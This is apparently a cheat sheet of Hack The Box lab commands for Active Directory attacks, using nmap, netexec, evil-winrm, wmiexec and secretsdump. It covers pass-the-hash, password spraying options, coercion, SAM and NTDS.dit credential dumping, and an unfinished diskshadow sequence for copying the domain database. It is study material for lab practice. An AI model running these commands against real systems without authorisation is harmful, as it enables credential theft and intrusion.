# HTB Commands (from 0xdf.gitlab.io)

## Nmap
- `nmap -p- -vvv --min-rate 10000 <target>`: Full port scan with verbose output and high rate.
- `nmap -sCV -p <ports> -vv <target>`: Script and version scan on specified ports with verbose output.

## Netexec
- `netexec smb <target> --gen-hosts-file <file>`: Generate hosts file for SMB.
- `netexec smb <target> -u <user> -p <pass> --shares`: List SMB shares.
- `netexec smb <target> -u <user> -p <pass> --continue-on-success`: Continue on successful authentication.
- `netexec smb <target> -u <user> -p <pass> -M change-password -o NEWPASS=<newpass>`: Change password via SMB.
- `netexec smb <target> -u <user> -p <pass> --pass-pol`: Retrieve password policy.
- `netexec smb <target> -u <user> -H <hash>`: Authenticate using NTLM hash.
- `netexec smb <target> -u <user> -p <pass> --rid-brute`: Brute-force RIDs.
- `netexec smb <target> -u <user$> -p <pass> -k --gen-tgt <tgt>`: Generate Kerberos TGT.
- `netexec smb <target> -u <user> -p <pass> -k --shares`: List shares using Kerberos.
- `netexec smb <target> -u <user> -p <pass> -k --gen-krb5-file <file>`: Generate Kerberos ticket file.
- `netexec smb <target> -u <user$> -p <pass> -M coerce_plus`: Coerce authentication.
- `netexec ldap <target> -u <user> -p <pass> --query "<filter>"`: Query LDAP with filter.
- `netexec ldap <target> -u <user> -p <pass> --bloodhound --dns-server <ip> -c All`: Collect BloodHound data.
- `netexec ldap <target> -u <user> -p <pass> --computers`: List computers in LDAP.
- `netexec ldap <target> -u <user> -p <pass> -M maq`: Retrieve machine account quota.
- `netexec ldap <target> --use-kcache --gmsa`: Use Kerberos cache for gMSA.
- `netexec winrm <target> -u <user> -p <pass>`: Connect via WinRM.
- `netexec winrm <target> -u <user> -H <hash>`: Connect via WinRM with hash.
- `netexec rdp <target> -u <user> -p <pass>`: Connect via RDP.
- `netexec ssh <target> -u <user> -p <pass>`: Connect via SSH.

## Evil-WinRM
- `evil-winrm-py -i <host> -u <user> -p <pass>`: Connect to WinRM with credentials.
- `evil-winrm-py -i <host> -u <user> -H <hash>`: Connect to WinRM with hash.
- `evil-winrm -r <realm> -i <dc>`: Connect to WinRM with realm and DC.

## Secretsdump
- `secretsdump.py -sam <sam> -system <system> LOCAL`: Dump SAM file locally.
- `secretsdump.py -ntds <ntds.dit> -system <system> LOCAL`: Dump NTDS.dit locally.
- `secretsdump.py -just-dc -no-pass '<computer$@ip>'`: Dump DC credentials.

## Wmiexec
- `wmiexec.py -hashes :<hash> <domain>/<user>@<host>`: Execute commands via WMI with hash.

## Diskshadow / Robocopy Sequence
```plaintext
set verbose on
set context persistent nowriters
set metadata C:\Windows\Temp\<file>.cab
add volume c: alias <alias>
create
expose %<alias>% e:
